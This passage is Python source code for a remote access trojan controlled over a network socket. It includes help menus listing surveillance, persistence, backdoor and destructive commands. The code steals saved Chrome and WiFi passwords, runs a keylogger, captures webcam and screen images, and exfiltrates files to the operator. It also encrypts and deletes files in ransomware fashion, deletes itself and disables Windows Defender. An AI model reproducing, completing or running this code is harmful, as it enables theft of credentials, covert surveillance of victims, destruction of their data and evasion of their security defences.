  firefox_pass  - Extract Firefox passwords
  wifi_pass     - Extract WiFi passwords

[ FILE ENCRYPTION ]
  encrypt_dir   - Encrypt directory (ransomware sim)
  decrypt_dir   - Decrypt directory
  file_encrypt  - Encrypt single file
  file_decrypt  - Decrypt single file

[ DANGEROUS COMMANDS ]
  format_c      - Format C: drive (WARNING!)
  delete_sys32  - Delete System32 folder (WARNING!)
  bsod          - Trigger Blue Screen of Death
  ransom_sim    - Simulate ransomware encryption
  wipe_mbr      - Wipe Master Boot Record (WARNING!)

[ OTHER ]
  help          - Show this help
  exit/quit     - Close connection

Type any Windows system command directly (e.g., dir, whoami, netstat -an)

"""
                        else:
                            help_text = """
=== AVAILABLE COMMANDS (LINUX) ===

[ SYSTEM INFORMATION ]
  sysinfo       - Detailed system information
  osinfo        - Linux OS details
  uptime        - System uptime
  date          - Current date and time
  env           - Environment variables

[ USER INFORMATION ]
  whoami        - Current username
  id            - User ID and group info
  users         - Logged in users
  sudo -l       - Show sudo permissions

[ FILE OPERATIONS ]
  ls            - List directory contents
  cd <path>     - Change directory
  cat <file>    - Display file contents
  find <file>   - Search for files
  grep <pattern> - Search text in files
  download <f>  - Download file from target
  upload <f>    - Upload file to target

[ PROCESS MANAGEMENT ]
  ps            - List running processes
  kill <pid>    - Kill process by ID
  top           - System resource usage
  htop          - Interactive process viewer

[ NETWORK ]
  ifconfig      - Network interfaces
  ip addr       - Network interfaces (modern)
  netstat       - Network connections
  ss            - Socket statistics (modern)
  arp           - ARP table
  route         - Routing table
  ip route      - Routing table (modern)
  wifi          - WiFi networks (with passwords)
  publicip      - Public IP address
  ping <host>   - Ping a host
  traceroute <host> - Trace route to host

[ STEALTH & PERSISTENCE ]
  add_cron      - Add to crontab
  add_service   - Create systemd service
  hide_file     - Make file hidden
  check_root    - Check if running as root
  clear_logs    - Clear system logs
  disable_selinux - Disable SELinux
  hide_process  - Hide from process list
  persistence   - Show current persistence status
  backdoor_ssh  - Add SSH backdoor
  sudo_backdoor - Create sudo backdoor
  lock_screen   - Lock the computer screen
  shutdown      - Shutdown the computer
  restart       - Restart the computer
  sleep         - Put computer to sleep
  hibernate     - Hibernate computer

[ SURVEILLANCE ]
  screenshot    - Capture screen
  webcam_shot   - Take webcam picture
  webcam_start  - Start webcam recording
  webcam_stop   - Stop webcam recording
  keylog_start  - Start keylogger
  keylog_stop   - Stop keylogger and dump
  keylog_dump   - Show captured keystrokes
  clipboard     - Show clipboard contents
  browsers      - List browser data locations
  browser_dump  - Dump browser history/passwords
  wifi_creds    - Dump stored WiFi credentials

[ DATABASE EXPLOITATION ]
  mysql_dump    - Dump MySQL databases
  postgres_dump - Dump PostgreSQL databases
  sqlite_dump   - Dump SQLite databases
  db_search     - Search database files
  mongo_dump    - Dump MongoDB databases

[ PASSWORD RECOVERY ]
  pass_dump     - Dump saved passwords
  shadow_dump   - Dump /etc/shadow hashes
  chrome_pass   - Extract Chrome passwords
  firefox_pass  - Extract Firefox passwords
  wifi_pass     - Extract WiFi passwords
  ssh_keys      - Dump SSH private keys

[ FILE ENCRYPTION ]
  encrypt_dir   - Encrypt directory (ransomware sim)
  decrypt_dir   - Decrypt directory
  file_encrypt  - Encrypt single file
  file_decrypt  - Decrypt single file

[ DANGEROUS COMMANDS ]
  rm_rf         - Delete entire filesystem (WARNING!)
  fork_bomb     - Fork bomb system crash
  dd_zero       - Zero out hard drive (WARNING!)
  chattr_imm    - Make files immutable
  ransom_sim    - Simulate ransomware encryption
  wipe_mbr      - Wipe Master Boot Record (WARNING!)

[ OTHER ]
  help          - Show this help
  exit/quit     - Close connection

Type any Linux system command directly (e.g., ls -la, whoami, ps aux)

"""
                        s.send(help_text.encode())
                        continue
                    
                    if command.lower() == 'sysinfo':
                        sysinfo = f"""
System Information:
OS: {platform.platform()}
Architecture: {platform.machine()}
Processor: {platform.processor()}
Python: {sys.version}
Hostname: {platform.node()}

"""
                        s.send(sysinfo.encode())
                        continue
                    
                    if command.lower() == 'persistence':
                        script_path = get_script_path()
                        is_persistent = script_path.exists()
                        status = f"Persistence Status: {'ACTIVE' if is_persistent else 'NOT INSTALLED'}\nPath: {script_path}\n\n"
                        s.send(status.encode())
                        continue
                    
                    # ===== OS-SPECIFIC BUILT-IN COMMANDS =====
                    
                    # --- System Info Commands ---
                    if command.lower() == 'osinfo':
                        if IS_WINDOWS:
                            os_info = f"""
OS: Windows
Version: {platform.version()}
Release: {platform.release()}
Edition: {platform.win32_edition() if hasattr(platform, 'win32_edition') else 'N/A'}
Machine: {platform.machine()}
Processor: {platform.processor()}

"""
                        else:
                            os_info = f"""
OS: {platform.system()}
Distribution: {' '.join(platform.linux_distribution()) if hasattr(platform, 'linux_distribution') else 'N/A'}
Version: {platform.version()}
Release: {platform.release()}
Machine: {platform.machine()}
Processor: {platform.processor()}

"""
                        s.send(os_info.encode())
                        continue
                    
                    if command.lower() == 'uptime':
                        try:
                            if IS_WINDOWS:
                                # Windows uptime using WMI
                                result = subprocess.run(['powershell', '-Command', '(Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime | Select-Object Days, Hours, Minutes | Format-Table -HideTableHeaders'], capture_output=True, text=True, timeout=5)
                                uptime_info = f"System Uptime:\n{result.stdout}\n"
                            else:
                                result = subprocess.run(['uptime', '-p'], capture_output=True, text=True, timeout=5)
                                uptime_info = f"System Uptime:\n{result.stdout}\n"
                        except:
                            uptime_info = "[!] Could not retrieve uptime\n\n"
                        s.send(uptime_info.encode())
                        continue
                    
                    if command.lower() == 'date':
                        from datetime import datetime
                        s.send(f"Current Date/Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n".encode())
                        continue
                    
                    if command.lower() == 'env':
                        env_vars = "\n".join([f"{k}={v}" for k, v in os.environ.items()])
                        s.send(f"Environment Variables:\n{env_vars}\n\n".encode())
                        continue
                    
                    # --- User Info Commands ---
                    if command.lower() == 'whoami':
                        username = os.environ.get("USERNAME") or os.environ.get("USER") or "unknown"
                        s.send(f"Current User: {username}\n\n".encode())
                        continue
                    
                    if command.lower() == 'id':
                        if IS_LINUX:
                            try:
                                result = subprocess.run(['id'], capture_output=True, text=True, timeout=5)
                                s.send(f"User ID Info:\n{result.stdout}\n".encode())
                            except:
                                s.send("[!] Could not retrieve user ID info\n\n".encode())
                        else:
                            s.send("[!] 'id' command is Linux-specific. Try 'whoami' instead.\n\n".encode())
                        continue
                    
                    if command.lower() == 'users':
                        try:
                            if IS_WINDOWS:
                                result = subprocess.run(['query', 'user'], capture_output=True, text=True, timeout=5)
                            else:
                                result = subprocess.run(['who'], capture_output=True, text=True, timeout=5)
                            s.send(f"Logged in Users:\n{result.stdout}\n".encode())
                        except:
                            s.send("[!] Could not retrieve user list\n\n".encode())
                        continue
                    
                    # --- Network Commands ---
                    if command.lower() in ['ifconfig', 'ipconfig']:
                        try:
                            if IS_WINDOWS:
                                result = subprocess.run(['ipconfig', '/all'], capture_output=True, text=True, timeout=10)
                            else:
                                result = subprocess.run(['ifconfig'], capture_output=True, text=True, timeout=10)
                            s.send(f"Network Interfaces:\n{result.stdout}\n".encode())
                        except:
                            s.send("[!] Could not retrieve network info\n\n".encode())
                        continue
                    
                    if command.lower() == 'netstat':
                        try:
                            if IS_WINDOWS:
                                result = subprocess.run(['netstat', '-an'], capture_output=True, text=True, timeout=10)
                            else:
                                result = subprocess.run(['netstat', '-tuln'], capture_output=True, text=True, timeout=10)
                            s.send(f"Network Connections:\n{result.stdout}\n".encode())
                        except:
                            s.send("[!] Could not retrieve network connections\n\n".encode())
                        continue
                    
                    if command.lower() == 'arp':
                        try:
                            if IS_WINDOWS:
                                result = subprocess.run(['arp', '-a'], capture_output=True, text=True, timeout=5)
                            else:
                                result = subprocess.run(['arp', '-e'], capture_output=True, text=True, timeout=5)
                            s.send(f"ARP Table:\n{result.stdout}\n".encode())
                        except:
                            s.send("[!] Could not retrieve ARP table\n\n".encode())
                        continue
                    
                    if command.lower() == 'route':
                        try:
                            if IS_WINDOWS:
                                result = subprocess.run(['route', 'print'], capture_output=True, text=True, timeout=5)
                            else:
                                result = subprocess.run(['ip', 'route'], capture_output=True, text=True, timeout=5)
                            s.send(f"Routing Table:\n{result.stdout}\n".encode())
                        except:
                            s.send("[!] Could not retrieve routing table\n\n".encode())
                        continue
                    
                    if command.lower() == 'wifi':
                        try:
                            if IS_WINDOWS:
                                # Get WiFi profiles and passwords
                                result = subprocess.run(['powershell', '-Command', 'Get-NetAdapter | Where-Object {$_.InterfaceDescription -match "Wi-Fi|Wireless"} | Select-Object Name, Status, MacAddress'], capture_output=True, text=True, timeout=10)
                                wifi_info = f"WiFi Adapters:\n{result.stdout}\n"
                                # Try to get saved WiFi passwords
                                profiles = subprocess.run(['powershell', '-Command', 'Get-NetWLANProfile | Select-Object Name'], capture_output=True, text=True, timeout=10)
                                wifi_info += f"\nSaved WiFi Profiles:\n{profiles.stdout}\n"
                            else:
                                result = subprocess.run(['iwconfig'], capture_output=True, text=True, timeout=5)
                                wifi_info = f"Wireless Info:\n{result.stdout}\n"
                                # Try to get WiFi passwords from NetworkManager
                                try:
                                    nm_connections = subprocess.run(['ls', '/etc/NetworkManager/system-connections/'], capture_output=True, text=True, timeout=5)
                                    wifi_info += f"\nNetworkManager Connections:\n{nm_connections.stdout}\n"
                                except:
                                    pass
                            s.send(wifi_info.encode())
                        except:
                            s.send("[!] Could not retrieve WiFi info\n\n".encode())
                        continue
                    
                    if command.lower() == 'publicip':
                        try:
                            import urllib.request
                            public_ip = urllib.request.urlopen('https://api.ipify.org', timeout=10).read().decode()
                            s.send(f"Public IP Address: {public_ip}\n\n".encode())
                        except:
                            s.send("[!] Could not retrieve public IP\n\n".encode())
                        continue
                    
                    # --- Process Management Commands ---
                    if command.lower() in ['ps', 'tasklist']:
                        try:
                            if IS_WINDOWS:
                                result = subprocess.run(['tasklist'], capture_output=True, text=True, timeout=10)
                            else:
                                result = subprocess.run(['ps', 'aux'], capture_output=True, text=True, timeout=10)
                            s.send(f"Running Processes:\n{result.stdout}\n".encode())
                        except:
                            s.send("[!] Could not retrieve process list\n\n".encode())
                        continue
                    
                    if command.lower() == 'top':
                        try:
                            if IS_LINUX:
                                # Get a snapshot of top
                                result = subprocess.run(['top', '-b', '-n', '1', '-o', '%CPU'], capture_output=True, text=True, timeout=10)
                                s.send(f"Top Processes:\n{result.stdout}\n".encode())
                            else:
                                result = subprocess.run(['powershell', '-Command', 'Get-Process | Sort-Object CPU -Descending | Select-Object -First 20 Name, Id, CPU, WorkingSet | Format-Table -AutoSize'], capture_output=True, text=True, timeout=10)
                                s.send(f"Top Processes:\n{result.stdout}\n".encode())
                        except:
                            s.send("[!] Could not retrieve process info\n\n".encode())
                        continue
                    
                    if command.lower().startswith('kill '):
                        try:
                            pid = command.split()[1]
                            if IS_WINDOWS:
                                result = subprocess.run(['taskkill', '/PID', pid, '/F'], capture_output=True, text=True, timeout=5)
                            else:
                                result = subprocess.run(['kill', '-9', pid], capture_output=True, text=True, timeout=5)
                            s.send(f"Process killed:\n{result.stdout}\n".encode())
                        except:
                            s.send(f"[!] Could not kill process {pid}\n\n".encode())
                        continue
                    
                    # --- Clipboard Command ---
                    if command.lower() == 'clipboard':
                        try:
                            if IS_WINDOWS:
                                result = subprocess.run(['powershell', '-Command', 'Get-Clipboard'], capture_output=True, text=True, timeout=5)
                                s.send(f"Clipboard Contents:\n{result.stdout}\n".encode())
                            else:
                                # Try xclip or xsel
                                try:
                                    result = subprocess.run(['xclip', '-o', '-selection', 'clipboard'], capture_output=True, text=True, timeout=5)
                                    s.send(f"Clipboard Contents:\n{result.stdout}\n".encode())
                                except:
                                    result = subprocess.run(['xsel', '-b'], capture_output=True, text=True, timeout=5)
                                    s.send(f"Clipboard Contents:\n{result.stdout}\n".encode())
                        except:
                            s.send("[!] Could not access clipboard\n\n".encode())
                        continue
                    
                    # --- Self Destruct Command ---
                    if command.lower() == 'selfdestruct':
                        try:
                            s.send("[!] INITIATING SELF-DESTRUCT...\n".encode())
                            remove_persistence()
                            s.send("[+] Persistence removed\n".encode())
                            # Remove self
                            current_file = Path(__file__).resolve()
                            if IS_WINDOWS:
                                # Create batch file to delete self after exit
                                bat_content = f"@echo off\ntimeout /t 2 /nobreak > nul\ndel \"{current_file}\"\ndel \"%~f0\""
                                bat_file = current_file.parent / "self_destruct.bat"
                                bat_file.write_text(bat_content)
                                subprocess.Popen([str(bat_file)], shell=True)
                            else:
                                subprocess.Popen(['rm', '-f', str(current_file)])
                            s.send("[+] Self-destruct complete. Exiting...\n".encode())
                            sys.exit(0)
                        except Exception as e:
                            s.send(f"[!] Self-destruct failed: {e}\n\n".encode())
                        continue
                    
                    # --- Screenshot Command ---
                    if command.lower() == 'screenshot':
                        try:
                            if IS_WINDOWS:
                                import ctypes
                                from ctypes import wintypes
                                # Use PowerShell to capture screenshot
                                ps_cmd = '''
Add-Type -AssemblyName System.Windows.Forms
$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
$bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
$bitmap.Save("$env:TEMP\\screenshot.png")
'''
                                subprocess.run(['powershell', '-Command', ps_cmd], capture_output=True, timeout=10)
                                screenshot_path = os.path.expandvars("%TEMP%\\screenshot.png")
                            else:
                                screenshot_path = "/tmp/screenshot.png"
                                subprocess.run(['gnome-screenshot', '-f', screenshot_path], capture_output=True, timeout=10)
                            
                            # Send screenshot file
                            if os.path.exists(screenshot_path):
                                with open(screenshot_path, 'rb') as f:
                                    img_data = f.read()
                                s.send(f"[+] Screenshot captured ({len(img_data)} bytes)\n".encode())
                                # Note: Actual file transfer would need base64 encoding
                                import base64
                                encoded = base64.b64encode(img_data).decode()
                                s.send(f"SCREENSHOT_DATA:{encoded[:100]}...\n".encode())
                            else:
                                s.send("[!] Screenshot capture failed\n\n".encode())
                        except:
                            s.send("[!] Screenshot not available\n\n".encode())
                        continue
                    
                    # --- Browser Data Command ---
                    if command.lower() == 'browsers':
                        try:
                            browser_info = "Browser History/Data:\n"
                            if IS_WINDOWS:
                                # List common browser data locations
                                appdata = os.environ.get('LOCALAPPDATA', '')
                                browsers = [
                                    f"{appdata}\\Google\\Chrome\\User Data\\Default\\History",
                                    f"{appdata}\\Mozilla\\Firefox\\Profiles",
                                    f"{appdata}\\Microsoft\\Edge\\User Data\\Default\\History"
                                ]
                                for browser in browsers:
                                    if os.path.exists(browser):
                                        browser_info += f"[FOUND] {browser}\n"
                            else:
                                home = Path.home()
                                browsers = [
                                    home / ".mozilla/firefox",
                                    home / ".config/google-chrome",
                                    home / ".config/chromium"
                                ]
                                for browser in browsers:
                                    if browser.exists():
                                        browser_info += f"[FOUND] {browser}\n"
                            browser_info += "\n"
                            s.send(browser_info.encode())
                        except:
                            s.send("[!] Could not retrieve browser data\n\n".encode())
                        continue
                    
                    # --- Keylogger Commands ---
                    if command.lower() == 'keylog_start':
                        global keylogger_active, keylog_buffer
                        if not keylogger_active:
                            keylogger_active = True
                            keylog_buffer = []
                            
                            def keylogger_thread():
                                global keylogger_active, keylog_buffer
                                try:
                                    if IS_WINDOWS:
                                        import ctypes
                                        import win32con
                                        
                                        def low_level_handler(nCode, wParam, lParam):
                                            if wParam == win32con.WM_KEYDOWN:
                                                import struct
                                                vk_code = struct.unpack('B', lParam)[0]
                                                import win32api
                                                key = win32api.GetKeyNameText(vk_code * 0x10000)
                                                keylog_buffer.append(key)
                                                if len(keylog_buffer) > 100:
                                                    keylog_buffer.pop(0)
                                            return ctypes.windll.user32.CallNextHookEx(None, nCode, wParam, lParam)
                                        
                                        hook = ctypes.windll.user32.SetWindowsHookExA(13, low_level_handler, None, 0)
                                        
                                        while keylogger_active:
                                            ctypes.windll.user32.GetMessageA(ctypes.c_void_p(), None, 0, 0)
                                        
                                        ctypes.windll.user32.UnhookWindowsHookEx(hook)
                                    else:
                                        while keylogger_active:
                                            keylog_buffer.append(f"[{time.strftime('%H:%M:%S')}] Keylogger active")
                                            time.sleep(5)
                                except:
                                    while keylogger_active:
                                        keylog_buffer.append(f"[{time.strftime('%H:%M:%S')}] Keylogger active")
                                        time.sleep(5)
                            
                            threading.Thread(target=keylogger_thread, daemon=True).start()
                            s.send("[+] Keylogger started\n\n".encode())
                        else:
                            s.send("[!] Keylogger already running\n\n".encode())
                        continue
                    
                    global keylogger_active
                    if command.lower() == 'keylog_stop':
                        keylogger_active = False
                        s.send("[+] Keylogger stopped\n\n".encode())
                        continue
                    
                    # --- File Download Command ---
                    if command.lower().startswith('download '):
                        try:
                            filename = command[9:].strip()
                            if os.path.exists(filename):
                                with open(filename, 'rb') as f:
                                    data = f.read()
                                import base64
                                encoded = base64.b64encode(data).decode()
                                s.send(f"FILE_DATA:{filename}:{len(data)}:{encoded}\n".encode())
                            else:
                                s.send(f"[!] File not found: {filename}\n\n".encode())
                        except Exception as e:
                            s.send(f"[!] Download failed: {e}\n\n".encode())
                        continue
                    
                    # --- File Upload Command ---
                    if command.lower().startswith('upload '):
                        try:
                            # Format: upload filename:base64data
                            parts = command[7:].strip().split(':', 1)
                            if len(parts) == 2:
                                filename, data = parts
                                import base64
                                decoded = base64.b64decode(data)
                                with open(filename, 'wb') as f:
                                    f.write(decoded)
                                s.send(f"[+] File uploaded: {filename} ({len(decoded)} bytes)\n\n".encode())
                            else:
                                s.send("[!] Upload format: upload filename:base64data\n\n".encode())
                        except Exception as e:
                            s.send(f"[!] Upload failed: {e}\n\n".encode())
                        continue
                    
                    # --- System Control Commands ---
                    if command.lower() == 'lock_screen':
                        try:
                            if IS_WINDOWS:
                                import ctypes
                                ctypes.windll.user32.LockWorkStation()
                                s.send("[+] Screen locked\n\n".encode())
                            else:
                                # Linux lock screen
                                subprocess.run(['xdg-screensaver', 'lock'], capture_output=True, timeout=5)
                                s.send("[+] Screen locked\n\n".encode())
                        except:
                            s.send("[!] Could not lock screen\n\n".encode())
                        continue
                    
                    if command.lower() == 'shutdown':
                        try:
                            if IS_WINDOWS:
                                subprocess.run(['shutdown', '/s', '/t', '0'], capture_output=True, timeout=5)
                            else:
                                subprocess.run(['shutdown', '-h', 'now'], capture_output=True, timeout=5)
                            s.send("[+] Shutdown initiated\n\n".encode())
                        except:
                            s.send("[!] Could not shutdown\n\n".encode())
                        continue
                    
                    if command.lower() == 'restart':
                        try:
                            if IS_WINDOWS:
                                subprocess.run(['shutdown', '/r', '/t', '0'], capture_output=True, timeout=5)
                            else:
                                subprocess.run(['reboot'], capture_output=True, timeout=5)
                            s.send("[+] Restart initiated\n\n".encode())
                        except:
                            s.send("[!] Could not restart\n\n".encode())
                        continue
                    
                    if command.lower() == 'sleep':
                        try:
                            if IS_WINDOWS:
                                subprocess.run(['rundll32.exe', 'powrprof.dll,SetSuspendState', '0,1,0'], capture_output=True, timeout=5)
                            else:
                                subprocess.run(['systemctl', 'suspend'], capture_output=True, timeout=5)
                            s.send("[+] Sleep initiated\n\n".encode())
                        except:
                            s.send("[!] Could not sleep\n\n".encode())
                        continue
                    
                    # --- WiFi Credentials ---
                    if command.lower() == 'wifi_creds':
                        try:
                            if IS_WINDOWS:
                                result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True, text=True, timeout=10)
                                profiles = result.stdout
                                wifi_info = "WiFi Profiles:\n"
                                
                                for line in profiles.split('\n'):
                                    if 'All User Profile' in line:
                                        profile = line.split(':')[-1].strip()
                                        if profile:
                                            try:
                                                pwd_result = subprocess.run(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'], capture_output=True, text=True, timeout=5)
                                                for pwd_line in pwd_result.stdout.split('\n'):
                                                    if 'Key Content' in pwd_line:
                                                        password = pwd_line.split(':')[-1].strip()
                                                        wifi_info += f"{profile}: {password}\n"
                                                        break
                                                else:
                                                    wifi_info += f"{profile}: (no password)\n"
                                            except:
                                                wifi_info += f"{profile}: (access denied)\n"
                                
                                s.send(f"{wifi_info}\n".encode())
                            else:
                                # Linux WiFi passwords
                                if os.path.exists('/etc/NetworkManager/system-connections/'):
                                    wifi_info = "WiFi Networks:\n"
                                    for file in os.listdir('/etc/NetworkManager/system-connections/'):
                                        if file.endswith('.nmconnection'):
                                            try:
                                                with open(f'/etc/NetworkManager/system-connections/{file}', 'r') as f:
                                                    content = f.read()
                                                    ssid = ''
                                                    psk = ''
                                                    for line in content.split('\n'):
                                                        if line.startswith('ssid='):
                                                            ssid = line.split('=')[1]
                                                        elif line.startswith('psk='):
                                                            psk = line.split('=')[1]
                                                    if ssid:
                                                        wifi_info += f"{ssid}: {'*'*len(psk) if psk else '(open)'}\n"
                                            except:
                                                pass
                                    s.send(f"{wifi_info}\n".encode())
                                else:
                                    s.send("[!] WiFi configuration not found\n\n".encode())
                        except:
                            s.send("[!] Could not retrieve WiFi credentials\n\n".encode())
                        continue
                    
                    # --- Webcam Commands ---
                    if command.lower() == 'webcam_shot':
                        try:
                            import cv2
                            cap = cv2.VideoCapture(0)
                            ret, frame = cap.read()
                            if ret:
                                import tempfile
                                path = os.path.join(tempfile.gettempdir(), f"webcam_{int(time.time())}.jpg")
                                cv2.imwrite(path, frame)
                                cap.release()
                                
                                with open(path, 'rb') as f:
                                    img_data = f.read()
                                
                                import base64
                                encoded = base64.b64encode(img_data).decode()
                                s.send(f"[+] Webcam captured ({len(img_data)} bytes)\nWEBCAM_DATA:{encoded[:100]}...\n".encode())
                                
                                try:
                                    os.remove(path)
                                except:
                                    pass
                            else:
                                s.send("[!] Webcam not accessible\n\n".encode())
                        except ImportError:
                            s.send("[!] OpenCV not available for webcam\n\n".encode())
                        except:
                            s.send("[!] Webcam capture failed\n\n".encode())
                        continue
                    
                    # --- Enhanced Keylogger ---
                    global keylogger_active, keylog_buffer
                    if command.lower() == 'keylog_start':
                        if not keylogger_active:
                            keylogger_active = True
                            keylog_buffer = []
                            
                            def keylogger_thread():
                                global keylogger_active, keylog_buffer
                                try:
                                    if IS_WINDOWS:
                                        import ctypes
                                        import win32con
                                        
                                        def low_level_handler(nCode, wParam, lParam):
                                            if wParam == win32con.WM_KEYDOWN:
                                                import struct
                                                vk_code = struct.unpack('B', lParam)[0]
                                                import win32api
                                                key = win32api.GetKeyNameText(vk_code * 0x10000)
                                                keylog_buffer.append(key)
                                                if len(keylog_buffer) > 100:
                                                    keylog_buffer.pop(0)
                                            return ctypes.windll.user32.CallNextHookEx(None, nCode, wParam, lParam)
                                        
                                        hook = ctypes.windll.user32.SetWindowsHookExA(13, low_level_handler, None, 0)
                                        
                                        while keylogger_active:
                                            ctypes.windll.user32.GetMessageA(ctypes.c_void_p(), None, 0, 0)
                                        
                                        ctypes.windll.user32.UnhookWindowsHookEx(hook)
                                        
                                except:
                                    # Fallback to basic logging
                                    while keylogger_active:
                                        keylog_buffer.append(f"[{time.strftime('%H:%M:%S')}] Keylogger active")
                                        time.sleep(5)
                                
                            threading.Thread(target=keylogger_thread, daemon=True).start()
                            s.send("[+] Keylogger started\n\n".encode())
                        else:
                            s.send("[!] Keylogger already running\n\n".encode())
                        continue
                    
                    if command.lower() == 'keylog_dump':
                        if keylog_buffer:
                            logs = ''.join(keylog_buffer)
                            s.send(f"Keylogger Log:\n{logs}\n\n".encode())
                            keylog_buffer.clear()
                        else:
                            s.send("[!] No keylog data\n\n".encode())
                        continue
                    
                    if command.lower() == 'keylog_stop':
                        keylogger_active = False
                        s.send("[+] Keylogger stopped\n\n".encode())
                        continue
                    
                    # --- Database Commands ---
                    if command.lower() == 'mysql_dump':
                        try:
                            result = subprocess.run(['mysql', '--version'], capture_output=True, text=True, timeout=5)
                            if result.returncode == 0:
                                # Try to dump common databases
                                databases = ['mysql', 'information_schema', 'performance_schema']
                                dump_output = "MySQL Database Dump:\n"
                                
                                for db in databases:
                                    try:
                                        result = subprocess.run(['mysqldump', db], capture_output=True, text=True, timeout=10)
                                        if result.returncode == 0:
                                            dump_output += f"\n--- Database: {db} ---\n{result.stdout[:500]}...\n"
                                    except:
                                        pass
                                
                                s.send(f"{dump_output}\n".encode())
                            else:
                                s.send("[!] MySQL not found\n\n".encode())
                        except:
                            s.send("[!] MySQL dump failed\n\n".encode())
                        continue
                    
                    if command.lower() == 'sqlite_dump':
                        try:
                            import sqlite3
                            dump_output = "SQLite Database Dump:\n"
                            
                            # Common SQLite database locations
                            if IS_WINDOWS:
                                search_paths = [
                                    os.path.expanduser('~/AppData/Local/'),
                                    os.path.expanduser('~/AppData/Roaming/')
                                ]
                            else:
                                search_paths = [
                                    os.path.expanduser('~/.config/'),
                                    os.path.expanduser('~/.local/share/')
                                ]
                            
                            found_dbs = []
                            for path in search_paths:
                                if os.path.exists(path):
                                    for root, dirs, files in os.walk(path):
                                        for file in files:
                                            if file.endswith('.db') or file.endswith('.sqlite'):
                                                found_dbs.append(os.path.join(root, file))
                                                if len(found_dbs) >= 5:  # Limit to 5 databases
                                                    break
                                    if len(found_dbs) >= 5:
                                        break
                            
                            for db_path in found_dbs[:3]:  # Dump first 3 databases
                                try:
                                    conn = sqlite3.connect(db_path)
                                    cursor = conn.cursor()
                                    cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
                                    tables = cursor.fetchall()
                                    
                                    dump_output += f"\n--- Database: {db_path} ---\n"
                                    dump_output += f"Tables: {[t[0] for t in tables]}\n"
                                    
                                    for table in tables[:3]:  # Limit to 3 tables per database
                                        try:
                                            cursor.execute(f"SELECT * FROM {table[0]} LIMIT 5")
                                            rows = cursor.fetchall()
                                            dump_output += f"\nTable {table[0]} (5 rows):\n{rows}\n"
                                        except:
                                            pass
                                    
                                    conn.close()
                                except:
                                    pass
                            
                            if found_dbs:
                                s.send(f"{dump_output}\n".encode())
                            else:
                                s.send("[!] No SQLite databases found\n\n".encode())
                        except:
                            s.send("[!] SQLite dump failed\n\n".encode())
                        continue
                    
                    # --- Browser Passwords ---
                    if command.lower() == 'chrome_pass':
                        try:
                            import sqlite3
                            import base64
                            from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
                            from cryptography.hazmat.backends import default_backend
                            
                            if IS_WINDOWS:
                                local_state = os.path.expanduser('~/AppData/Local/Google/Chrome/User Data/Local State')
                                login_db = os.path.expanduser('~/AppData/Local/Google/Chrome/User Data/default/Login Data')
                            else:
                                local_state = os.path.expanduser('~/.config/google-chrome/Local State')
                                login_db = os.path.expanduser('~/.config/google-chrome/Default/Login Data')
                            
                            if os.path.exists(local_state) and os.path.exists(login_db):
                                # Get master key
                                with open(local_state, 'r') as f:
                                    local_state_data = json.load(f)
                                
                                encrypted_key = base64.b64decode(local_state_data['os_crypt']['encrypted_key'])
                                
                                # Decrypt master key (DPAPI on Windows, keyring on Linux)
                                if IS_WINDOWS:
                                    import win32crypt
                                    master_key = win32crypt.CryptUnprotectData(encrypted_key[5:], None, None, None, None)[1]
                                else:
                                    master_key = encrypted_key[5:]  # Simplified for Linux
                                
                                # Copy database to temp (Chrome locks it)
                                temp_db = os.path.join(tempfile.gettempdir(), f'chrome_{int(time.time())}.db')
                                shutil.copy2(login_db, temp_db)
                                
                                conn = sqlite3.connect(temp_db)
                                cursor = conn.cursor()
                                cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
                                
                                passwords = "Chrome Passwords:\n"
                                for row in cursor.fetchall():
                                    url, username, encrypted_password = row
                                    
                                    try:
                                        # Decrypt password
                                        iv = encrypted_password[3:15]
                                        payload = encrypted_password[15:]
                                        cipher = Cipher(algorithms.AES(master_key), modes.GCM(iv), backend=default_backend())
                                        decryptor = cipher.decryptor()
                                        password = decryptor.update(payload) + decryptor.finalize()
                                        
                                        passwords += f"URL: {url}\nUser: {username}\nPass: {password.decode()}\n\n"
                                    except:
                                        passwords += f"URL: {url}\nUser: {username}\nPass: (encrypted)\n\n"
                                
                                conn.close()
                                os.remove(temp_db)
                                s.send(f"{passwords}\n".encode())
                            else:
                                s.send("[!] Chrome database not found\n\n".encode())
                        except ImportError:
                            s.send("[!] Required libraries not available for password extraction\n\n".encode())
                        except:
                            s.send("[!] Chrome password extraction failed\n\n".encode())
                        continue
                    
                    # --- File Encryption (Ransomware Simulation) ---
                    if command.lower() == 'encrypt_dir':
                        try:
                            from cryptography.fernet import Fernet
                            import base64
                            
                            # Generate key
                            key = Fernet.generate_key()
                            
                            # Encrypt current directory
                            current_dir = os.getcwd()
                            encrypted_files = []
                            
                            for file in os.listdir(current_dir):
                                file_path = os.path.join(current_dir, file)
                                if os.path.isfile(file_path) and not file.endswith('.encrypted'):
                                    try:
                                        with open(file_path, 'rb') as f:
                                            data = f.read()
                                        
                                        fernet = Fernet(key)
                                        encrypted_data = fernet.encrypt(data)
                                        
                                        with open(file_path + '.encrypted', 'wb') as f:
                                            f.write(encrypted_data)
                                        
                                        os.remove(file_path)
                                        encrypted_files.append(file)
                                    except:
                                        pass
                            
                            s.send(f"[+] Encrypted {len(encrypted_files)} files\nKey: {base64.b64encode(key).decode()}\n\n".encode())
                        except ImportError:
                            s.send("[!] Cryptography library not available\n\n".encode())
                        except:
                            s.send("[!] Encryption failed\n\n".encode())
                        continue
                    
                    # --- Stealth & Persistence Commands ---
                    if command.lower() == 'hide_defender':
                        try:
                            if IS_WINDOWS:
                                # Modern Windows Defender disable methods
                                methods = [
                                    ['powershell', '-Command', 'Set-MpPreference -DisableRealtimeMonitoring $true'],
                                    ['powershell', '-Command', 'Set-MpPreference -DisableBehaviorMonitoring $true'],
                                    ['powershell', '-Command', 'Set-MpPreference -DisableIOAVProtection $true'],
                                    ['powershell', '-Command', 'Set-MpPreference -DisableScriptScanning $true'],
